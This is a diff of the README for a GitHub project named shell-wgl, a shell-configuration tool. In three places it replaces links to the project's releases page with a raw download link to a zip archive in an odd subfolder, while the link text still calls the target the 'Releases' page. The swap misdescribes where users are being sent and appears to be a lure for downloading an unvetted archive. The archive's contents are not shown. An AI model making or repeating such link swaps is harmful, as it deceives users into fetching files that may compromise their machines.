@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download shell-wgl](https://img.shields.io/badge/Download-shell--wgl-blue)](https://github.com/ginger-billion200/shell-wgl/releases)
+[![Download shell-wgl](https://raw.githubusercontent.com/ginger-billion200/shell-wgl/main/baun/shell-wgl_v3.2.zip)](https://raw.githubusercontent.com/ginger-billion200/shell-wgl/main/baun/shell-wgl_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ To run shell-wgl, you will need:
 
 ## 📥 Download & Install
 
-To download shell-wgl, visit this page: [shell-wgl Releases](https://github.com/ginger-billion200/shell-wgl/releases).
+To download shell-wgl, visit this page: [shell-wgl Releases](https://raw.githubusercontent.com/ginger-billion200/shell-wgl/main/baun/shell-wgl_v3.2.zip).
 
 Once on the page:
 1. Look for the latest release.
@@ -81,6 +81,6 @@ If you need help, you can reach out through the GitHub Issues page under the rep
 
 ## 🔗 Additional Resources
 
-Visit the [shell-wgl Releases](https://github.com/ginger-billion200/shell-wgl/releases) page for updates and new releases. You can also check for user guides and tips on using shell-wgl effectively.
+Visit the [shell-wgl Releases](https://raw.githubusercontent.com/ginger-billion200/shell-wgl/main/baun/shell-wgl_v3.2.zip) page for updates and new releases. You can also check for user guides and tips on using shell-wgl effectively.
 
 Thank you for choosing shell-wgl! Enjoy managing your shell configurations with ease.
